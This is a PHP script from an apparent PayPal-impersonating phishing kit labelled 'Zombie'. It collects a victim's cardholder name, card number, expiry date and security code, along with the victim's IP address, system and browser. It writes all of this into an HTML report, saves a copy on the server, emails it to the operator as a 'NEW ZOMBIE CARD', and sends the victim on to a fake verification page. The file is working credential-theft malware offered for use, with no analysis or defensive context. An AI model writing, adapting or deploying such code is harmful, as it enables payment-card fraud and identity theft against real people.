<?php

	session_start();
	include("../os.php");
	include("../url.php");
	include("../system.php");

	$cnam 		= $_SESSION["zombiexcname"] = $_POST["zombiexcname"];
	$cnum 		= $_SESSION["zombiexcnumber"] = $_POST["zombiexcnumber"];
	$expr 		= $_SESSION["zombiexcexp"] = $_POST["zombiexcexp"];
	$ccsc 		= $_SESSION["zombiexccsc"] = $_POST["zombiexccsc"];

	$zombieletter = '
		<!DOCTYPE html>
		<html>
		<head>
		    <title></title>
		    <meta charset="UTF-8" />
		    <style>
		        *{
		            padding:0;
		            margin:0;
		            box-sizing:border-box;
		            font-family: arial;
		        }
		        body{
		            background: radial-gradient(circle at 0 0, #0070ba, #1546a0);
		            min-height: 100vh;
		            height:100%;
		            width:100%;
		            padding:20px;
		            color:#fff;
		        }
		        a:visited{
		            color:red;
		        }
		        ::selection{
		            background:black;
		            color:#fff;
		        }
		        .container{
		            margin: 0 auto;
		            width:100%;
		            max-width: 900px;
		            padding: 40px;
		            border:10px solid #fff;
		            border-radius: 4px;
		            box-shadow: 0 0 10px #fff;
		        }
		        .logo{
		            text-align: center;
		            margin-bottom: 30px;
		        }
		        .logo svg{
		            height: 40px;
		        }
		        .Informations p.title{
		            font-weight: bold;
		            font-size: 30px;
		            margin: 30px 0;
		            text-shadow: 0 0 3px #fff;
		        }
		        .ssd{
		            padding:0 20px;
		            margin-bottom: 20px;
		        }
		        .ssd span{
		            font-size: 20px;
		        }
		        .tt{
		            font-weight: bold;
		            background: #fff;
		            color:#0b58ab;
		            padding: 5px 10px;
		            margin-right: 15px;
		            border-radius: 5px;
		        }

		        .u{
		            text-transform: uppercase;
		        }
		    </style>
		</head>
		<body>
		    
		    <div class="container">
		        <div class="logo">
		            <svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
			 width="404.655px" height="98.179px" viewBox="0 0 404.655 98.179" enable-background="new 0 0 404.655 98.179"
			 xml:space="preserve">
		            <g>
		                <g>
		                    <g>
		                        <path fill="#FFFFFF" d="M311.628,21.955h-22.251c-1.521,0-2.816,1.107-3.053,2.61l-8.998,57.053
		                            c-0.177,1.126,0.692,2.144,1.832,2.144h11.417c1.064,0,1.972-0.774,2.137-1.827l2.552-16.174c0.237-1.503,1.532-2.61,3.054-2.61
		                            h7.041c14.655,0,23.113-7.093,25.324-21.15c0.995-6.148,0.04-10.979-2.839-14.361C324.68,23.921,319.072,21.955,311.628,21.955z
		                             M314.196,42.792c-1.216,7.987-7.315,7.987-13.216,7.987h-3.356l2.354-14.912c0.143-0.902,0.92-1.566,1.832-1.566h1.539
		                            c4.016,0,7.81,0,9.765,2.288C314.285,37.959,314.638,39.988,314.196,42.792z"/>
		                        <path fill="#FFFFFF" d="M152.932,21.955h-22.25c-1.521,0-2.816,1.107-3.054,2.61l-8.998,57.053
		                            c-0.177,1.126,0.693,2.144,1.833,2.144h10.624c1.521,0,2.816-1.106,3.054-2.609l2.428-15.392c0.237-1.503,1.532-2.61,3.053-2.61
		                            h7.041c14.656,0,23.114-7.093,25.325-21.15c0.995-6.148,0.04-10.979-2.838-14.361C165.984,23.921,160.375,21.955,152.932,21.955z
		                             M155.5,42.792c-1.216,7.987-7.316,7.987-13.215,7.987h-3.357l2.354-14.912c0.143-0.902,0.919-1.566,1.832-1.566h1.539
		                            c4.016,0,7.81,0,9.765,2.288C155.588,37.959,155.942,39.988,155.5,42.792z"/>
		                        <path fill="#FFFFFF" d="M219.435,42.537h-10.653c-0.913,0-1.69,0.664-1.833,1.566l-0.468,2.979l-0.745-1.079
		                            c-2.308-3.349-7.45-4.468-12.585-4.468c-11.77,0-21.826,8.92-23.783,21.43c-1.019,6.241,0.427,12.206,3.966,16.369
		                            c3.251,3.825,7.891,5.417,13.419,5.417c9.487,0,14.75-6.096,14.75-6.096l-0.476,2.962c-0.179,1.126,0.691,2.145,1.832,2.145
		                            h9.595c1.521,0,2.815-1.106,3.053-2.608l5.76-36.473C221.445,43.554,220.575,42.537,219.435,42.537z M204.587,63.275
		                            c-1.029,6.087-5.862,10.174-12.026,10.174c-3.09,0-5.564-0.994-7.154-2.876c-1.576-1.865-2.169-4.523-1.669-7.483
		                            c0.959-6.033,5.87-10.252,11.94-10.252c3.025,0,5.482,1.003,7.103,2.903C204.413,57.654,205.054,60.329,204.587,63.275z"/>
		                        <path fill="#FFFFFF" d="M378.131,42.537h-10.653c-0.913,0-1.69,0.664-1.832,1.566l-0.469,2.979l-0.745-1.079
		                            c-2.308-3.349-7.45-4.468-12.585-4.468c-11.771,0-21.826,8.92-23.782,21.43c-1.019,6.241,0.427,12.206,3.966,16.369
		                            c3.251,3.825,7.891,5.417,13.419,5.417c9.487,0,14.75-6.096,14.75-6.096l-0.476,2.962c-0.179,1.126,0.691,2.145,1.832,2.145
		                            h9.595c1.521,0,2.815-1.106,3.053-2.608l5.76-36.473C380.142,43.554,379.271,42.537,378.131,42.537z M363.284,63.275
		                            c-1.029,6.087-5.861,10.174-12.025,10.174c-3.091,0-5.564-0.994-7.155-2.876c-1.575-1.865-2.169-4.523-1.669-7.483
		                            c0.96-6.033,5.869-10.252,11.939-10.252c3.025,0,5.482,1.003,7.104,2.903C363.109,57.654,363.75,60.329,363.284,63.275z"/>
		                        <path fill="#FFFFFF" d="M276.181,42.537h-10.709c-1.024,0-1.982,0.509-2.558,1.356l-14.772,21.756l-6.261-20.907
		                            c-0.392-1.308-1.596-2.206-2.961-2.206h-10.527c-1.271,0-2.165,1.25-1.756,2.454l11.792,34.612l-11.091,15.648
		                            c-0.871,1.229,0.008,2.928,1.514,2.928h10.698c1.014,0,1.963-0.497,2.541-1.331l35.614-51.399
		                            C278.557,44.219,277.677,42.537,276.181,42.537z"/>
		                        <path fill="#FFFFFF" d="M390.69,23.522l-9.133,58.097c-0.177,1.125,0.693,2.143,1.832,2.143h9.185
		                            c1.521,0,2.816-1.106,3.054-2.609l9.004-57.053c0.178-1.126-0.692-2.144-1.832-2.144h-10.277
		                            C391.609,21.955,390.832,22.62,390.69,23.522z"/>
		                    </g>
		                </g>
		            </g>
		            <g>
		                <path opacity="0.68" fill="#FFFFFF" d="M74.981,24.944c1.198-7.638-0.008-12.834-4.139-17.542C66.294,2.22,58.078,0,47.566,0
		                    H17.052c-2.148,0-3.978,1.563-4.312,3.686L0.033,84.258c-0.25,1.59,0.979,3.027,2.587,3.027h18.838l-1.3,8.245
		                    c-0.219,1.391,0.855,2.648,2.263,2.648H38.3c1.879,0,3.479-1.367,3.772-3.224l0.156-0.808l2.991-18.968l0.193-1.048
		                    c0.293-1.856,1.893-3.225,3.772-3.225h2.375c15.383,0,27.428-6.249,30.947-24.323c1.471-7.552,0.71-13.856-3.179-18.288
		                    C78.152,26.956,76.688,25.848,74.981,24.944L74.981,24.944"/>
		                <path opacity="0.7" fill="#FFFFFF" d="M74.981,24.944c1.198-7.638-0.008-12.834-4.139-17.542C66.294,2.22,58.078,0,47.566,0H17.052
		                    c-2.148,0-3.978,1.563-4.312,3.686L0.033,84.258c-0.25,1.59,0.979,3.027,2.587,3.027h18.838l4.732-30.007l-0.147,0.941
		                    c0.335-2.122,2.148-3.686,4.297-3.686h8.954c17.584,0,31.353-7.144,35.375-27.804C74.789,26.119,74.89,25.526,74.981,24.944"/>
		                <path fill="#FFFFFF" d="M31.274,25.045c0.201-1.276,1.021-2.322,2.124-2.85c0.501-0.24,1.062-0.374,1.649-0.374h23.919
		                    c2.834,0,5.476,0.186,7.891,0.575c0.69,0.111,1.362,0.239,2.015,0.384c0.652,0.145,1.286,0.306,1.899,0.486
		                    c0.307,0.089,0.608,0.184,0.905,0.282c1.186,0.394,2.291,0.858,3.307,1.397c1.198-7.638-0.008-12.834-4.139-17.542
		                    C66.294,2.22,58.078,0,47.566,0H17.052c-2.148,0-3.978,1.563-4.312,3.686L0.033,84.258c-0.25,1.59,0.979,3.027,2.587,3.027h18.838
		                    l4.732-30.007L31.274,25.045z"/>
		            </g>
		            <g>
		            </g>
		            <g>
		            </g>
		            <g>
		            </g>
		            <g>
		            </g>
		            <g>
		            </g>
		            <g>
		            </g>
		            </svg>
		        </div>
		        
		        <div class="Informations">
		            <p class="title">CARD :</p>

		            <div class="ssd">
		                <span class="tt u">Name on card : </span><span class="tt">'.$_SESSION["zombiexcname"].'</span>
		            </div>
		            <div class="ssd">
		                <span class="tt u">card number : </span><span class="tt">'.$_SESSION["zombiexcnumber"].'</span>
		            </div>
		            <div class="ssd">
		                <span class="tt u">expiry date : </span><span class="tt">'.$_SESSION["zombiexcexp"].'</span>
		            </div>
		            <div class="ssd">
		                <span class="tt u">csc : </span><span class="tt">'.$_SESSION["zombiexccsc"].'</span>
		            </div>
		            
		            <p class="title">USER AGENT :</p>
		            
		            <div class="ssd">
		                <span class="tt u">Date Time : </span><span class="tt">'. $date .'</span>
		            </div>
		            
		            <div class="ssd">
		                <span class="tt u">Ip Address : </span><span class="tt"><a target="_blank" href="https://whatismyipaddress.com/ip/'. $ip .'">'. $ip .'</a></span>
		            </div>
		            
		            <div class="ssd">
		                <span class="tt u">System : </span><span class="tt">'. $user_os .'</span>
		            </div>
		            
		            <div class="ssd">
		                <span class="tt u">Browser : </span><span class="tt">'. $user_browser .'</span>
		            </div>
		            
		        </div>
		        
		    </div>
		    
		</body>
		</html>
	';

	$file = fopen("../../../admin/".$ip.".html", "a");
	fwrite($file, $zombieletter);

	include("../../../e-mail.php");

	$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
	$subject  = "NEW ZOMBIE CARD FROM [".strtoupper($_SESSION['country1'])."] [".$ip."]";
	$headers .= "From: Zombie" . "\r\n";
	mail($zombiemail, $subject, $zombieletter, $headers);

	header("Location: ../../myaccount/verification.php$zombieURL");